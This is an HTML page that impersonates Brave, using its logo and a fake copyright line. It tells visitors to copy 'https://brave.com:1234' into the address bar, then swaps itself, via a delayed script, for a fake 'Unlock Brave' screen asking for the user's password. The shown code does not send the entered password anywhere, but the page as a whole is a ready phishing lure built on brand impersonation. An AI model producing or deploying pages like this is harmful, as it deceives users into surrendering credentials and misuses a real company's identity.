<!DOCTYPE html>
<html>
  <head>
    <title>Brave Login</title>
    <style>
      body {
        font-family: 'Inter', Arial, sans-serif;
        background-color: #fdfdfd;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: #1e1e2f;
      }

      .card {
        background-color: white;
        max-width: 420px;
        padding: 40px;
        border-radius: 18px;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
        text-align: center;
        transition: all 0.3s ease;
      }

      .brave-logo {
        width: 64px;
        margin-bottom: 20px;
      }

      h2 {
        font-size: 22px;
        margin-bottom: 10px;
      }

      p {
        font-size: 15px;
        color: #555;
        margin-bottom: 16px;
      }

      .url-box {
        background: #ffe8d6;
        padding: 12px;
        border-radius: 8px;
        font-family: monospace;
        font-size: 14px;
        color: #333;
        word-break: break-word;
        margin-bottom: 20px;
      }

      button {
        background-color: #fb542b;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 10px;
        font-size: 14px;
        cursor: pointer;
        font-weight: 500;
        transition: background 0.2s ease;
      }

      button:hover {
        background-color: #d54221;
      }
    </style>
  </head>
  <body>
    <div class="card" id="card">
      <img class="brave-logo" src="https://brave.com/static-assets/images/brave-logo-sans-text.svg" alt="Brave Logo">
      <h2>Connect with Brave</h2>
      <p>Copy and paste the URL below into your address bar:</p>
      <div class="url-box" id="304url">https://brave.com:1234</div>
      <button onclick="copyUrl()">ðŸ“‹ Copy URL</button>
    </div>

    <script>
      function copyUrl() {
        const url = document.getElementById("304url");
        const range = document.createRange();
        const selection = window.getSelection();
        range.selectNodeContents(url);
        selection.removeAllRanges();
        selection.addRange(range);
        document.execCommand("copy");

        setTimeout(() => {
          document.body.innerHTML = `
            <style>
              body {
                font-family: 'Inter', Arial, sans-serif;
                background-color: #fefaf6;
                margin: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
              }

              .login-container {
                background: white;
                padding: 40px;
                border-radius: 18px;
                box-shadow: 0 6px 28px rgba(0,0,0,0.08);
                width: 320px;
                text-align: center;
              }

              .brave-logo {
                width: 60px;
                margin-bottom: 20px;
              }

              h2 {
                margin: 10px 0;
                font-size: 20px;
              }

              p {
                color: #666;
                margin-bottom: 20px;
                font-size: 14px;
              }

              input[type="password"] {
                width: 100%;
                padding: 12px;
                margin-bottom: 20px;
                border: 1px solid #ccc;
                border-radius: 8px;
                font-size: 14px;
                box-sizing: border-box;
              }

              button {
                width: 100%;
                padding: 12px;
                background: #fb542b;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                font-size: 14px;
                cursor: pointer;
              }

              button:hover {
                background: #d54221;
              }

              .footer {
                margin-top: 20px;
                font-size: 11px;
                color: #999;
              }
            </style>

            <div class="login-container">
              <img class="brave-logo" src="https://brave.com/static-assets/images/brave-logo-sans-text.svg" alt="Brave Logo">
              <h2>Unlock Brave</h2>
              <p>Enter your Brave password</p>
              <input type="password" placeholder="Password" />
              <button>Unlock</button>
              <div class="footer">Â© Brave Software Inc.</div>
            </div>
          `;
        }, 4300);
      }
    </script>
  </body>
</html>
